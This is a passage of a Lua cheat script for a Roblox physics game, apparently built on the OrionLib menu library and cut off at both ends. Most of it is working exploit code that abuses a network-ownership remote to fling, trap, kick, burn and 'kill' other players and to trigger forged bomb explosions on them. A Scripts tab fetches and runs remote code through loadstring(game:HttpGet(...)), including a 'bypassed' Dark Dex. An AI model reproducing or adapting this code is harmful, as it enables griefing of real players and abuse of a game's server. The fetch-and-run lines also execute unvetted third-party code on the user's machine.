                            print("Mounted on blobman")
                            blobman = v
                            foundBlobman = true
                            break
                        end
                    end
                end
                print("Out of the loop!")

                if not foundBlobman then
                    print("No mount found")
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "You must be mounted upon a blobman to begin this process. Please mount one and toggle this again!", 
                        Image = "rbxassetid://4483345998", 
                        Time = 5
                    })
                    blobman1:Set(false)
                    blobman = nil
                    coroutine.close(blobmanCoroutine)
                    blobmanCoroutine = nil
                    return
                end

                while true do
                    pcall(function()
                        while wait() do
                            for i, v in pairs(Players:GetChildren()) do
                                if blobman and v ~= localPlayer then
                                    blobGrabPlayer(v, blobman)
                                    print(v.Name)
                                    wait(_G.BlobmanDelay)
                                end
                            end
                        end
                    end)
                    wait(0.02)
                end
            end)
            coroutine.resume(blobmanCoroutine)
        else
            if blobmanCoroutine then
                coroutine.close(blobmanCoroutine)
                blobmanCoroutine = nil
                blobman = nil
            end
        end
    end
})
BlobmanTab:AddSlider({
    Name = "Delay",
    Min = 0.000001,
    Max = 1,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = ".",
    Increment = 0.001,
    Default = _G.BlobmanDelay ,
    Callback = function(value)
        _G.BlobmanDelay  = value
    end
})
AuraTab:AddLabel("Auras")

AuraTab:AddSlider({
    Name = "Radius",
    Min = 5,
    Max = 40,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = ".",
    Increment = 1,
    Default = auraRadius,
    Callback = function(value)
        auraRadius = value
    end
})

AuraTab:AddToggle({
    Name = "Air Suspend Aura",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Callback = function(enabled)
        if enabled then
            auraCoroutine = coroutine.create(function()
                while true do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") then
                            local head = character.Head
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                coroutine.wrap(function()
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Torso")
                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                task.wait(0.1)
                                                local velocity = playerTorso:FindFirstChild("l") or Instance.new("BodyVelocity", playerTorso)
                                                velocity.Name = "l"
                                                velocity.Velocity = Vector3.new(0, 50, 0)
                                                velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                                Debris:AddItem(velocity, 100)
                                            end
                                        end
                                    end
                                end)()
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Air Suspend Aura: " .. tostring(err))
                    end
                    wait(0.02)
                end
            end)
            coroutine.resume(auraCoroutine)
        else
            if auraCoroutine then
                coroutine.close(auraCoroutine)
                auraCoroutine = nil
            end
        end
    end
})

AuraTab:AddToggle({
    Name = "Hell send Aura",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Callback = function(enabled)
        if enabled then
            gravityCoroutine = coroutine.create(function()
                while enabled do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("HumanoidRootPart") then
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    local playerCharacter = player.Character
                                    local playerTorso = playerCharacter:FindFirstChild("Torso")
                                    if playerTorso then
                                        local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                        if distance <= auraRadius then
                                            SetNetworkOwner:FireServer(playerTorso, humanoidRootPart.FirePlayerPart.CFrame)
                                            task.wait(0.1)
                                            local force = playerTorso:FindFirstChild("GravityForce") or Instance.new("BodyForce")
                                            force.Parent = playerTorso
                                            force.Name = "GravityForce"
                                            for _, part in ipairs(playerCharacter:GetDescendants()) do
                                                if part:IsA("BasePart") then
                                                    part.CanCollide = false
                                                end
                                            end
                                            force.Force = Vector3.new(0, 1200, 0)
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Hell send Aura: " .. tostring(err))
                    end
                    wait(0.02)
                end
            end)
            coroutine.resume(gravityCoroutine)
        elseif gravityCoroutine then
            coroutine.close(gravityCoroutine)
            gravityCoroutine = nil
        end
    end
})

AuraTab:AddToggle({
    Name = "Kick Aura",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Callback = function(enabled)
        if auraToggle == 1 then
            if enabled then
                kickCoroutine = coroutine.create(function()
                    while enabled do
                        local success, err = pcall(function()
                            local character = localPlayer.Character
                            if character and character:FindFirstChild("HumanoidRootPart") then
                                local humanoidRootPart = character.HumanoidRootPart

                                for _, player in pairs(Players:GetPlayers()) do
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Head")

                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerCharacter:WaitForChild("HumanoidRootPart").FirePlayerPart, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                if not platforms[player] then
                                                    local platform = playerCharacter:FindFirstChild("FloatingPlatform") or Instance.new("Part")
                                                    platform.Name = "FloatingPlatform"
                                                    platform.Size = Vector3.new(5, 2, 5)
                                                    platform.Anchored = true
                                                    platform.Transparency = 1
                                                    platform.CanCollide = true
                                                    platform.Parent = playerCharacter
                                                    platforms[player] = platform
                                                end
                                            end
                                        end
                                    end
                                end
                                for player, platform in pairs(platforms) do
                                    if player.Character and player.Character.Humanoid and player.Character.Humanoid.Health > 1 then
                                        local playerHumanoidRootPart = player.Character.HumanoidRootPart
                                        platform.Position = playerHumanoidRootPart.Position - Vector3.new(0, 3.994, 0)
                                    else
                                        platforms[player] = nil
                                    end
                                end
                            end
                        end)
                        if not success then
                            warn("Error in Kick Aura: " .. tostring(err))
                        end
                        wait(0.02)
                    end
                end)
                coroutine.resume(kickCoroutine)
            elseif kickCoroutine then
                coroutine.close(kickCoroutine)
                kickCoroutine = nil
                for _, platform in pairs(platforms) do
                    if platform then
                        platform:Destroy()
                    end
                end
                platforms = {}
            end
        elseif auraToggle == 2 then
            if enabled then
                kickCoroutine = coroutine.create(function()
                    while enabled do
                        local success, err = pcall(function()
                            local character = localPlayer.Character
                            if character and character:FindFirstChild("HumanoidRootPart") then
                                local humanoidRootPart = character.HumanoidRootPart

                                for _, player in pairs(Players:GetPlayers()) do
                                    if player ~= localPlayer and player.Character then
                                        local playerCharacter = player.Character
                                        local playerTorso = playerCharacter:FindFirstChild("Head")

                                        if playerTorso then
                                            local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                            if distance <= auraRadius then
                                                SetNetworkOwner:FireServer(playerCharacter:WaitForChild("HumanoidRootPart").FirePlayerPart, playerCharacter.HumanoidRootPart.FirePlayerPart.CFrame)
                                                if not playerCharacter.HumanoidRootPart.FirePlayerPart:FindFirstChild("BodyVelocity") then
                                                    local bodyVelocity = Instance.new("BodyVelocity")
                                                    bodyVelocity.Name = "BodyVelocity"
                                                    bodyVelocity.Velocity = Vector3.new(0, 20, 0) 
                                                    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                    bodyVelocity.Parent = playerCharacter.HumanoidRootPart.FirePlayerPart
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                        if not success then
                            warn("Error in Kick Aura (Sky mode): " .. tostring(err))
                        end
                        wait(0.02)
                    end
                end)
                coroutine.resume(kickCoroutine)
            else
                if kickCoroutine then
                    coroutine.close(kickCoroutine)
                    kickCoroutine = nil
                end
            end
        end
    end
})

AuraTab:AddDropdown({
    Name = "Select Kick Mode",
    Options = {"Sky", "Silent"},
    Default = "",
    Save = false,
    Flag = "KickModeFlag",
    Callback = function(selected)
        if selected == "Sky" then 
            auraToggle = 2 
        else 
            auraToggle = 1 
        end
    end
})

AuraTab:AddToggle({
    Name = "Poison Aura",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Callback = function(enabled)
        if enabled then
            poisonAuraCoroutine = coroutine.create(function()
                while enabled do
                    local success, err = pcall(function()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("HumanoidRootPart") then
                            local humanoidRootPart = character.HumanoidRootPart

                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    local playerCharacter = player.Character
                                    local playerTorso = playerCharacter:FindFirstChild("Torso")
                                    if playerTorso then
                                        local distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                        if distance <= auraRadius then
                                            local head = playerCharacter:FindFirstChild("Head")
                                            while distance <= auraRadius do
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.CFrame)
                                                distance = (playerTorso.Position - humanoidRootPart.Position).Magnitude
                                                for _, part in pairs(poisonHurtParts) do
                                                    part.Size = Vector3.new(1, 3, 1)
                                                    part.Transparency = 1
                                                    part.Position = head.Position
                                                end
                                                wait()
                                                for _, part in pairs(poisonHurtParts) do
                                                    part.Position = Vector3.new(0, -200, 0)
                                                end
                                            end
                                            for _, part in pairs(poisonHurtParts) do
                                                part.Position = Vector3.new(0, -200, 0)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    if not success then
                        warn("Error in Poison Aura: " .. tostring(err))
                    end
                    wait(0.02)
                end
            end)
            coroutine.resume(poisonAuraCoroutine)
        elseif poisonAuraCoroutine then
            coroutine.close(poisonAuraCoroutine)
            for _, part in pairs(poisonHurtParts) do
                part.Position = Vector3.new(0, -200, 0)
            end
            poisonAuraCoroutine = nil
        end
    end
})


CharacterTab:AddToggle({
    Name = "Crouch Speed",
    Default = false,
    Save = false,
    Color = Color3.fromRGB(240, 0, 0),
    Flag = "CrouchSpeed",
    Callback = function(enabled)
        if enabled then
            crouchSpeedCoroutine = coroutine.create(function()
                while true do
                    pcall(function()
                        if not playerCharacter.Humanoid then return end
                        if playerCharacter.Humanoid.WalkSpeed == 5 then
                            playerCharacter.Humanoid.WalkSpeed = crouchWalkSpeed
                        end
                    end)
                    wait()
                end
            end)
            coroutine.resume(crouchSpeedCoroutine)
        elseif crouchSpeedCoroutine then
            coroutine.close(crouchSpeedCoroutine)
            crouchSpeedCoroutine = nil
            if playerCharacter.Humanoid then
                playerCharacter.Humanoid.WalkSpeed = 16
            end
        end
    end
})

CharacterTab:AddSlider({
    Name = "Set Crouch Speed",
    Min = 6,
    Max = 1000,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = ".",
    Increment = 1,
    Default = crouchWalkSpeed,
    Save = false,
    Flag = "SetCrouchSpeed",
    Callback = function(value)
        crouchWalkSpeed = value
    end
})

CharacterTab:AddToggle({
    Name = "Crouch Jump Power",
    Default = false,
    Save = false,
    Flag = "CrouchJumpPower",
    Color = Color3.fromRGB(240, 0, 0),
    Callback = function(enabled)
        if enabled then
            crouchJumpCoroutine = coroutine.create(function()
                while true do
                    pcall(function()
                        if not playerCharacter.Humanoid then return end
                        if playerCharacter.Humanoid.JumpPower == 12 then
                            playerCharacter.Humanoid.JumpPower = crouchJumpPower
                        end
                    end)
                    wait()
                end
            end)
            coroutine.resume(crouchJumpCoroutine)
        elseif crouchJumpCoroutine then
            coroutine.close(crouchJumpCoroutine)
            crouchJumpCoroutine = nil
            if playerCharacter.Humanoid then
                playerCharacter.Humanoid.JumpPower = 24
            end
        end
    end
})

CharacterTab:AddSlider({
    Name = "Set Crouch Jump Power",
    Min = 6,
    Max = 1000,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = ".",
    Increment = 1,
    Default = crouchJumpPower,
    Save = false,
    Flag = "SetCrouchJumpPower",
    Callback = function(value)
        crouchJumpPower = value
    end
})


FunTab:AddLabel("Clone Manipulation (grab them to keep their NetworkOwnership)")

FunTab:AddSlider({
    Name = "Offset",
    Min = 1,
    Max = 10,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = ".",
    Increment = 1,
    Default = decoyOffset,
    Callback = function(value)
        decoyOffset = value
    end
})

FunTab:AddTextbox({
    Name = "Circle Radius",
    Default = "Radius for Surround Mode (Adjust based on clones)",
    TextDisappear = false,
    Callback = function(value)
        circleRadius = tonumber(value) or 10
    end
})

FunTab:AddButton({
    Name = "Decoy Follow",
    Callback = function()
        local decoys = {}
        for _, descendant in pairs(workspace:GetDescendants()) do
            if descendant:IsA("Model") and descendant.Name == "YouDecoy" then
                table.insert(decoys, descendant)
            end
        end
        local numDecoys = #decoys
        local midPoint = math.ceil(numDecoys / 2)

        local function updateDecoyPositions()
            for index, decoy in pairs(decoys) do
                local torso = decoy:FindFirstChild("Torso")
                if torso then
                    local bodyPosition = torso:FindFirstChild("BodyPosition")
                    local bodyGyro = torso:FindFirstChild("BodyGyro")
                    if bodyPosition and bodyGyro then
                        local targetPosition
                        if followMode then
                            if playerCharacter and playerCharacter:FindFirstChild("HumanoidRootPart") then
                                targetPosition = playerCharacter.HumanoidRootPart.Position
                                local offset = (index - midPoint) * decoyOffset
                                local forward = playerCharacter.HumanoidRootPart.CFrame.LookVector
                                local right = playerCharacter.HumanoidRootPart.CFrame.RightVector
                                targetPosition = targetPosition - forward * decoyOffset + right * offset
                            end
                        else
                            local nearestPlayer = getNearestPlayer()
                            if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local angle = math.rad((index - 1) * (360 / numDecoys))
                                targetPosition = nearestPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * circleRadius, 0, math.sin(angle) * circleRadius)
                                bodyGyro.CFrame = CFrame.new(torso.Position, nearestPlayer.Character.HumanoidRootPart.Position)
                            end
                        end

                        if targetPosition then
                            local distance = (targetPosition - torso.Position).Magnitude
                            if distance > stopDistance then
                                bodyPosition.Position = targetPosition
                                if followMode then
                                    bodyGyro.CFrame = CFrame.new(torso.Position, targetPosition)
                                end
                            else
                                bodyPosition.Position = torso.Position
                                bodyGyro.CFrame = torso.CFrame
                            end
                        end
                    end
                end
            end
        end

        local function setupDecoy(decoy)
            local torso = decoy:FindFirstChild("Torso")
            if torso then
                local bodyPosition = Instance.new("BodyPosition")
                local bodyGyro = Instance.new("BodyGyro")
                bodyPosition.Parent = torso
                bodyGyro.Parent = torso
                bodyPosition.MaxForce = Vector3.new(40000, 40000, 40000)
                bodyPosition.D = 100
                bodyPosition.P = 100
                bodyGyro.MaxTorque = Vector3.new(40000, 40000, 40000)
                bodyGyro.D = 100
                bodyGyro.P = 20000
                local connection = RunService.Heartbeat:Connect(function()
                    updateDecoyPositions()
                end)
                table.insert(connections, connection)
                SetNetworkOwner:FireServer(torso, playerCharacter.Head.CFrame)
            end
        end

        for _, decoy in pairs(decoys) do
            setupDecoy(decoy)
        end
        OrionLib:MakeNotification({Name = "Notification", Content = "Got "..numDecoys.." units. Manually click each unit if they don't move", Image = "rbxassetid://4483345998", Time = 5})
    end
})

FunTab:AddButton({
    Name = "Toggle Mode",
    
    Callback = function()
        followMode = not followMode
    end
})

FunTab:AddButton({
    Name = "Disconnect Clones",
    Callback = cleanupConnections(connections)
})


ScriptTab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
    end
})
ScriptTab:AddButton({
    Name = "Infinite Yield REBORN",
    Callback = function()
        loadstring(game:HttpGet("https://github.com/fuckusfm/infiniteyield-reborn/raw/master/source"))()
    end
})

ScriptTab:AddButton({
    Name = "Dark Dex V3",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
    end
})
local KeybindSection = KeybindsTab:AddSection({Name = "Player Keybinds"})
KeybindSection:AddParagraph("Tip", "Press while looking at a player")

KeybindSection:AddBind({
    Name = "Send To Hell",
    Default = "Z",
    Hold = false,
    Save = false,
    Flag = "SendToHellKeybind",
    Callback = function()
        local mouse = localPlayer:GetMouse()
        local target = mouse.Target
        if target and target:IsA("BasePart") then
            local character = target.Parent
            if target.Name == "FirePlayerPart" then
                character = target.Parent.Parent
            end
            if character:IsA("Model") and character:FindFirstChildOfClass("Humanoid") then
                SetNetworkOwner:FireServer(character.HumanoidRootPart, character.HumanoidRootPart.CFrame)
                for _, part in ipairs(character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Part") then
                        part.CanCollide = false
                    end
                end

                local bodyVelocity = Instance.new("BodyVelocity")
                bodyVelocity.Parent = character.Torso
                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bodyVelocity.Velocity = Vector3.new(0, -4, 0)
                character.Torso.CanCollide = false
                task.wait(1)
                character.Torso.CanCollide = false
            end
        end
    end
})

KeybindSection:AddBind({
    Name = "Kick",
    Default = "X",
    Hold = false,
    Save = false,
    Flag = "KickKeybind",
    Callback = function()
        local mouse = localPlayer:GetMouse()
        local target = mouse.Target
        if target and target:IsA("BasePart") then
            local character = target.Parent
            if target.Name == "FirePlayerPart" then
                character = target.Parent.Parent
            end
            if character:IsA("Model") and character:FindFirstChildOfClass("Humanoid") then
                if kickMode == 1 then   
                    SetNetworkOwner:FireServer(character.HumanoidRootPart.FirePlayerPart, character.HumanoidRootPart.FirePlayerPart.CFrame)
                    local bodyVelocity = Instance.new("BodyVelocity")
                    bodyVelocity.Parent = character.HumanoidRootPart.FirePlayerPart
                    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bodyVelocity.Velocity = Vector3.new(0, 20, 0)
                elseif kickMode == 2 then
                    SetNetworkOwner:FireServer(character.HumanoidRootPart.FirePlayerPart, character.HumanoidRootPart.FirePlayerPart.CFrame)
                    local platform = Instance.new("Part")
                    platform.Name = "FloatingPlatform"
                    platform.Size = Vector3.new(5, 2, 5)
                    platform.Anchored = true
                    platform.Transparency = 1
                    platform.CanCollide = true
                    platform.Parent = character
                    while character do
                        wait()
                        platform.Position = character.HumanoidRootPart.Position - Vector3.new(0, 3.994, 0)
                    end 
                end
            end
        end
    end
})

KeybindSection:AddDropdown({
    Name = "Select Kick Mode",
    Options = {"Sky", "Silent"},
    Default = "Silent",
    Callback = function(selected)
        if selected == "Sky" then kickMode = 1 else kickMode = 2 end
    end
})

KeybindSection:AddBind({
    Name = "Kill (Unstable)",
    Default = "C",
    Hold = false,
    Save = false,
    Flag = "KillKeybind",
    Callback = function()
        local mouse = localPlayer:GetMouse()
        local target = mouse.Target
        if target and target:IsA("BasePart") then
            local character = target.Parent
            if target.Name == "FirePlayerPart" then
                character = target.Parent.Parent
            end
            if character:IsA("Model") and character:FindFirstChildOfClass("Humanoid") then
                SetNetworkOwner:FireServer(character.HumanoidRootPart, character.HumanoidRootPart.CFrame)
                SetNetworkOwner:FireServer(character.Head, character.Head.CFrame)
                for _, motor in pairs(character.Torso:GetChildren()) do
                    SetNetworkOwner:FireServer(character.Head, character.Head.CFrame)
                    if motor:IsA('Motor6D') then motor:Destroy() end
                end
                task.wait(0.5)
                SetNetworkOwner:FireServer(character.Head, character.Head.CFrame)
            end
        end
    end
})

KeybindSection:AddBind({
    Name = "Burn",
    Default = "V",
    Hold = false,
    Save = false,
    Flag = "BurnKeybind",
    Callback = function()
        local mouse = localPlayer:GetMouse()
        local target = mouse.Target
        if not ownedToys["Campfire"] then 
            OrionLib:MakeNotification({Name = "Missing toy", Content = "You do not own the Campfire toy. ", Image = "rbxassetid://4483345998", Time = 3})
            return
        end
        if target and target:IsA("BasePart") then
            local character = target.Parent
            if target.Name == "FirePlayerPart" then
                character = target.Parent.Parent
            end
            if character:IsA("Model") and character:FindFirstChildOfClass("Humanoid") then
                if not toysFolder:FindFirstChild("Campfire") then
                    spawnItem("Campfire", Vector3.new(-72.9304581, -5.96906614, -265.543732))
                end
                local campfire = toysFolder.Campfire
                local firePlayerPart
                SetNetworkOwner:FireServer(character.HumanoidRootPart, character.HumanoidRootPart.CFrame)
                for _, part in pairs(campfire:GetChildren()) do
                    if part.Name == "FirePlayerPart" then
                        part.Size = Vector3.new(9, 9, 9)
                        firePlayerPart = part
                        break
                    end
                end
                firePlayerPart.Position = character.Head.Position or character.HumanoidRootPart.Position
                task.wait(0.5)
                firePlayerPart.Position = Vector3.new(0, -50, 0)
            end
        end
    end
})
local KeybindSection2 = KeybindsTab:AddSection({Name = "Missilea Keybinds"})
KeybindSection2:AddParagraph("Tip", "Press anywhere")
KeybindSection2:AddBind({
    Name = "Explode Bomb",
    Default = "B",
    Hold = false,
    Save = false,
    Flag = "ExplodeBombKeybind",
    Callback = function()
        if not ownedToys["BombMissile"] then 
            OrionLib:MakeNotification({Name = "Missing toy", Content = "You do not own the BombMissile toy. ", Image = "rbxassetid://4483345998", Time = 3})
            return
        end
        local connection
        connection = toysFolder.ChildAdded:Connect(function(child)
            if child.Name == "BombMissile" then
                if child:WaitForChild("ThisToysNumber", 1) then
                    if child.ThisToysNumber.Value == (toysFolder.ToyNumber.Value - 1) then
                        connection:Disconnect()
                        
                        SetNetworkOwner:FireServer(child.PartHitDetector, child.PartHitDetector.CFrame)
                        local bomb = child
                        local args = {
                            [1] = {
                                ["Radius"] = 17.5,
                                ["TimeLength"] = 2,
                                ["Hitbox"] = child.PartHitDetector,
                                ["ExplodesByFire"] = false,
                                ["MaxForcePerStudSquared"] = 225,
                                ["Model"] = child,
                                ["ImpactSpeed"] = 100,
                                ["ExplodesByPointy"] = false,
                                ["DestroysModel"] = false,
                                ["PositionPart"] = child.Body
                            },
                            [2] = child.Body.Position
                        }
                        ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode"):FireServer(unpack(args))

                    end
                end
            end
        end)
        spawnItemCf("BombMissile", playerCharacter.Head.CFrame or playerCharacter.HumanoidRootPart.CFrame)
        wait(1)
        connection:Disconnect()
    end
})
KeybindSection2:AddBind({
    Name = "Throw Bomb",
    Default = "M",
    Hold = false,
    Save = false,
    Flag = "ThrowBombKeybind",
    Callback = function()
        if not ownedToys["BombMissile"] then 
            OrionLib:MakeNotification({Name = "Missing toy", Content = "You do not own the BombMissile toy. ", Image = "rbxassetid://4483345998", Time = 3})
            return
        end
        
        local connection
        connection = toysFolder.ChildAdded:Connect(function(child)
            if child.Name == "BombMissile" then
                if child:WaitForChild("ThisToysNumber", 1) then
               
                    if child.ThisToysNumber.Value == (toysFolder.ToyNumber.Value - 1) then
           
                        connection:Disconnect()

                        SetNetworkOwner:FireServer(child.PartHitDetector, child.PartHitDetector.CFrame)
                        local velocityObj = Instance.new("BodyVelocity", child.PartHitDetector)
                        velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        velocityObj.Velocity = workspace.CurrentCamera.CFrame.lookVector * 500
                        Debris:AddItem(velocityObj, 10)
                    end
                end
            end
        end)
        spawnItemCf("BombMissile", playerCharacter.Head.CFrame or playerCharacter.HumanoidRootPart.CFrame)
    end
})

KeybindSection2:AddBind({
    Name = "Explode Firework",
    Default = "N",
    Hold = false,
    Save = false,
    Flag = "ExplodeFireworkKeybind",
    Callback = function()
        if not ownedToys["FireworkMissile"] then 
            OrionLib:MakeNotification({Name = "Missing toy", Content = "You do not own the FireworkMissile toy. ", Image = "rbxassetid://4483345998", Time = 3})
            return
        end
        local connection
        connection = toysFolder.ChildAdded:Connect(function(child)
            if child.Name == "FireworkMissile" then
                if child:WaitForChild("ThisToysNumber", 1) then
                    if child.ThisToysNumber.Value == (toysFolder.ToyNumber.Value - 1) then
                        connection:Disconnect()
                        
                        SetNetworkOwner:FireServer(child.PartHitDetector, child.PartHitDetector.CFrame)
                        local bomb = child
                        local args = {
                            [1] = {
                                ["Radius"] = 17.5,
                                ["TimeLength"] = 2,
                                ["Hitbox"] = child.PartHitDetector,
                                ["ExplodesByFire"] = false,
                                ["MaxForcePerStudSquared"] = 225,
                                ["Model"] = child,
                                ["ImpactSpeed"] = 100,
                                ["ExplodesByPointy"] = false,
                                ["DestroysModel"] = false,
                                ["PositionPart"] = child.Body
                            },
                            [2] = child.Body.Position
                        }
                        ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode"):FireServer(unpack(args))

                    end
                end
            end
        end)
        spawnItemCf("FireworkMissile", playerCharacter.Head.CFrame or playerCharacter.HumanoidRootPart.CFrame)
        wait(1)
        connection:Disconnect()
    end
})

KeybindSection2:AddBind({
    Name = "Explode Cached Missile",
    Default = "T",
    Hold = false,
    Save = false,
    Flag = "ExplodeCachedBombKeybind",
    Callback = function()
        if #bombList == 0 then 
            OrionLib:MakeNotification({Name = "No bombs", Content = "There are no cached bombs to explode", Image = "rbxassetid://4483345998", Time = 2})
            return
        end

        local bomb = table.remove(bombList, 1)

        local args = {
            [1] = {
                ["Radius"] = 17.5,
                ["TimeLength"] = 2,
                ["Hitbox"] = bomb.PartHitDetector,
                ["ExplodesByFire"] = false,
                ["MaxForcePerStudSquared"] = 225,
                ["Model"] = bomb,
                ["ImpactSpeed"] = 100,
                ["ExplodesByPointy"] = false,
                ["DestroysModel"] = false,
                ["PositionPart"] = localPlayer.Character.HumanoidRootPart or localPlayer.Character.PrimaryPart
            },
            [2] = localPlayer.Character.HumanoidRootPart.Position or localPlayer.Character.PrimaryPart.Position
        }
        ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode"):FireServer(unpack(args))
    end
})
KeybindSection2:AddBind({
    Name = "Explode All Cached Missiles",
    Default = "Y",
    Hold = false,
    Save = false,
    Flag = "ExplodeAllCachedBombsKeybind",
    Callback = function()
        if #bombList == 0 then 
            OrionLib:MakeNotification({Name = "No bombs", Content = "There are no cached bombs to explode", Image = "rbxassetid://4483345998", Time = 2})
            return
        end
        for i = #bombList, 1, -1 do
            local bomb = table.remove(bombList, i)
            local args = {
                [1] = {
                    ["Radius"] = 17.5,
                    ["TimeLength"] = 2,
                    ["Hitbox"] = bomb.PartHitDetector,
                    ["ExplodesByFire"] = false,
                    ["MaxForcePerStudSquared"] = 225,
                    ["Model"] = bomb,
                    ["ImpactSpeed"] = 100,
                    ["ExplodesByPointy"] = false,
                    ["DestroysModel"] = false,
                    ["PositionPart"] = localPlayer.Character.HumanoidRootPart or localPlayer.Character.PrimaryPart
                },
                [2] = localPlayer.Character.HumanoidRootPart.Position or localPlayer.Character.PrimaryPart.Position
            }
            ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode"):FireServer(unpack(args))
        end
    end
})

KeybindSection2:AddBind({
    Name = "Explode All Cached Missiles On Nearest Player",
    Default = "U",
    Hold = false,
    Save = false,
    Flag = "ExplodeAllCachedBombsOnNearestPlayerKeybind",
    Callback = function()
        if #bombList == 0 then 
            OrionLib:MakeNotification({Name = "No bombs", Content = "There are no cached bombs to explode", Image = "rbxassetid://4483345998", Time = 2})
            return
        end
        local char = getNearestPlayer().Character
        for i = #bombList, 1, -1 do
            local bomb = table.remove(bombList, i)
            local args = {
                [1] = {
                    ["Radius"] = 17.5,
                    ["TimeLength"] = 2,
                    ["Hitbox"] = bomb.PartHitDetector,
                    ["ExplodesByFire"] = false,
                    ["MaxForcePerStudSquared"] = 225,
                    ["Model"] = bomb,
                    ["ImpactSpeed"] = 100,
                    ["ExplodesByPointy"] = false,
                    ["DestroysModel"] = false,
                    ["PositionPart"] = char.HumanoidRootPart or char.Torso or char.PrimaryPart
                },
                [2] = char.HumanoidRootPart.Position or char.Torso.Position or char.PrimaryPart.Position
            }
            ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode"):FireServer(unpack(args))
        end
    end
})

KeybindSection2:AddToggle({
    Name = "stupid dev thingy (ignore)",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Callback = function(enabled)
		if enabled then
			for i, v in pairs(toysFolder:GetChildren()) do
				if v.Name ~= "ToyNumber" then
                    local part
                    if v:FindFirstChild("SoundPart") then
                        part = v.SoundPart
                    elseif v.PrimaryPart then
                        part = v.PrimaryPart
                    else
                        part = v:FindFirstChildWhichIsActive("BasePart")
                    end
					table.insert(lightbitparts, part)
					for _, p in pairs(v:GetDescendants()) do
						if p:IsA("BasePart") then
							p.CanCollide = false
						end
					end
            

					local bodyPosition = Instance.new("BodyPosition")

					bodyPosition.P = 15000
					bodyPosition.D = 200
					bodyPosition.MaxForce = Vector3.new(5000000, 5000000, 5000000)
					bodyPosition.Parent = part
					bodyPosition.Position = part.Position
					table.insert(bodyPositions, bodyPosition)

					local alignOrientation = Instance.new("AlignOrientation")
					alignOrientation.MaxTorque = 400000
					alignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
					alignOrientation.Responsiveness = 2000
					alignOrientation.Parent = part
					alignOrientation.PrimaryAxisOnly = false
					table.insert(alignOrientations, alignOrientation)

					local attachment = Instance.new("Attachment")
					attachment.Parent = part
					alignOrientation.Attachment0 = attachment
				end
			end
			lightorbitcon = RunService.Heartbeat:Connect(function()
				if not localPlayer.Character or not localPlayer.Character.HumanoidRootPart then return end
				lightbitoffset = lightbitoffset + lightbit
				lightbitpos = U.GetSurroundingVectors(localPlayer.Character.HumanoidRootPart.Position, usingradius, #lightbitparts, lightbitoffset)

				for i, v in ipairs(lightbitpos) do
					bodyPositions[i].Position = v
					local direction = (localPlayer.Character.HumanoidRootPart.Position - bodyPositions[i].Position).unit
					local lookAtCFrame = CFrame.lookAt(bodyPositions[i].Position, localPlayer.Character.HumanoidRootPart.Position)
					alignOrientations[i].CFrame = lookAtCFrame
				end
			end)
		else
            pcall(function()
                lightorbitcon:Disconnect()
            end)
			
			for i, v in ipairs(lightbitparts) do
